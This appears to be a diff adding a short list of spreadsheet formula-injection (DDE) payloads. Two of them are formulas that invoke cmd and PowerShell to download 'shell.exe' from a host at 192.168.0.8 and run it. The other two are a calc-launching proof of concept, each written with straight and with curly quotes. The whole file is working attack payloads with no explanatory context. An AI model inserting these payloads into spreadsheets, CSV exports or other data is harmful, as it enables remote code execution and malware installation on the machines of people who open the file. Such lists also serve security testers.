@@ -1,0 +1,5 @@
+=cmd|’ /C powershell Invoke-WebRequest “http://192.168.0.8:8/shell.exe” -OutFile “$env:Tempshell.exe”; Start-Process “$env:Tempshell.exe”‘!A1
+=cmd|' /C powershell Invoke-WebRequest "http://192.168.0.8:8/shell.exe" -OutFile "$env:Tempshell.exe"; Start-Process "$env:Tempshell.exe"'!A1
+
+=cmd|’ /C calc’!A1
+=cmd|' /C calc'!A1
